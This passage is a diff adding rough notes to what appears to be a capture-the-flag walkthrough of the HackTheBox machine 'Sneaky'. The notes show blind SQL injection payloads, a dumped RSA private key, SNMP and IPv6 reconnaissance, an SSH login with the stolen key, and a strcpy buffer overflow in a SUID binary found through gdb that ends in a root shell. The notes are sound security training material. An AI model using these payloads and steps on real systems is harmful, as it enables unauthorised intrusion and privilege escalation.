@@ -131,5 +131,187 @@ available databases [4]:
 [*] performance_schema
 
 
+Parameter: name (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: name=-7068' OR 8424=8424 OR 'bmgy'='tzZL&pass=123
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: name=123' AND (SELECT 5289 FROM (SELECT(SLEEP(5)))Ilbn) OR 'lkkl'='qLhh&pass=123
+
+
+name: admin
+
+name: thrasivoulos
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5
+Lc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr
+3mi0MyfiGRh/Xr4L0+SwYdylkuX72E7rLkkigSt4s/zXp5dJmL2RBZDJf1Qh6Ugb
+yDxG2ER49/wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn
+cb+zfPcTvcP0t63kdEreQbdASYK6/e7Iih/5eBy3i8YoNJd6Wr8/qVtmB+FuxcFj
+oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa
+Nyp/9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR
+h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G/8U/lcx1tiWfUNkLdC
+CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX/cUcblPDdOmxvazpnP4PW1rEpW8cT
+OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a
+I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB
+JkQxeUkCgYEA3RBR/0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz
+5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY
+ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt/MmoSaASbqpwhPSUCgYEA2uym
++jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu
+7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC
+GR4wYcZF0iH/t4tn02qqOPaRGJAB3BD/B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne
+aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q/tv7E3kT195MuS10J
+VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x
+hxNWWZcUFcRuxp5ogcvBdQKBgQDB/AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd
+1/iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi/93oJa1on/QJlvbv4GO9y3LZ
+LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG
+UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k/
+Hu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31
+rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb
+-----END RSA PRIVATE KEY-----
+
+
+
+nmpwalk -v2c -c public 10.10.10.20 > snmp.txt
+
+python enyx.py 2c public 10.10.10.20
+
+
+[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
+[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:752d
+[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:752d
+
+this tells us the ipv6 on this box
+
+
+kali@kali:~/htb/sneaky$ ping6 dead:beef:0000:0000:0250:56ff:feb9:752d
+PING dead:beef:0000:0000:0250:56ff:feb9:752d(dead:beef::250:56ff:feb9:752d) 56 data bytes
+64 bytes from dead:beef::250:56ff:feb9:752d: icmp_seq=1 ttl=63 time=216 ms
+64 bytes from dead:beef::250:56ff:feb9:752d: icmp_seq=2 ttl=63 time=153 ms
+^C
+
+
+it's up as well
+
+scan on ipv6
+kali@kali:~/Downloads$ nmap -6 -sC -sV dead:beef::250:56ff:feb9:752d
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 00:52 EDT
+Nmap scan report for dead:beef::250:56ff:feb9:752d
+Host is up (0.15s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 5d:5d:2a:97:85:a1:20:e2:26:e4:13:54:58:d6:a4:22 (DSA)
+|   2048 a2:00:0e:99:0f:d3:ed:b0:19:d4:6b:a8:b1:93:d9:87 (RSA)
+|   256 e3:29:c4:cb:87:98:df:99:6f:36:9f:31:50:e3:b9:42 (ECDSA)
+|_  256 e6:85:a8:f8:62:67:f7:01:28:a1:aa:00:b5:60:f2:21 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: 400 Bad Request
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| address-info: 
+|   IPv6 EUI-64: 
+|     MAC address: 
+|       address: 00:50:56:b9:75:2d
+|_      manuf: VMware
+
+ssh is open on ipv6
+
+
+kali@kali:/tmp$ ssh -i ./ssh.key thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:752d
+Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Sun Jul  5 05:40:19 EEST 2020
+
+  System load: 0.0               Memory usage: 5%   Processes:       178
+  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Your Hardware Enablement Stack (HWE) is supported until April 2019.
+Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
+thrasivoulos@Sneaky:~$ 
+
+
+find / -perm -4000 2>/dev/null
+
+
+what is this file ?
+
+/usr/local/bin/chal
+
+
+thrasivoulos@Sneaky:~$ /usr/local/bin/chal 
+Segmentation fault (core dumped)
+thrasivoulos@Sneaky:~$ 
+thrasivoulos@Sneaky:~$ 
+thrasivoulos@Sneaky:~$ /usr/local/bin/chal 123
+thrasivoulos@Sneaky:~$ string /usr/local/bin/chal 
+No command 'string' found, did you mean:
+ Command 'spring' from package 'spring' (universe)
+ Command 'strings' from package 'binutils' (main)
+ Command 'strings' from package 'binutils-multiarch' (main)
+string: command not found
+thrasivoulos@Sneaky:~$ strings /usr/local/bin/chal 
+/lib/ld-linux.so.2
+e"-h[
+libc.so.6
+_IO_stdin_used
+strcpy
+
+
+strcpy :)
+
+$ sysctl -a | grep -i random
+kernel.randomize_va_space = 0
+
+ASLR is disabled....
+
+
+gdb-peda$ pattern_offset 0x25415525
+625038629 found at offset: 362
+
+
+(gdb) b main*
+Function "main*" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) y
+Breakpoint 1 (main*) pending.
+(gdb) r `python -c 'print "A"*500'`
+Starting program: /usr/local/bin/chal `python -c 'print "A"*500'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info frame
+Stack level 0, frame at 0xbffff4e4:
+ eip = 0x41414141; saved eip = 0x41414141
+ called by frame at 0xbffff4e8
+ Arglist at 0xbffff4dc, args: 
+ Locals at 0xbffff4dc, Previous frame's sp is 0xbffff4e4
+ Saved registers:
+  eip at 0xbffff4e0
+(gdb) quit
+A debugging session is active.
+
+        Inferior 1 [process 1881] will be killed.
+
+Quit anyway? (y or n) y
+thrasivoulos@Sneaky:~$ vi input.py 
+thrasivoulos@Sneaky:~$ /usr/local/bin/chal `python input.py`
+# 
+# 
+# 
+
+
+
+
 
 
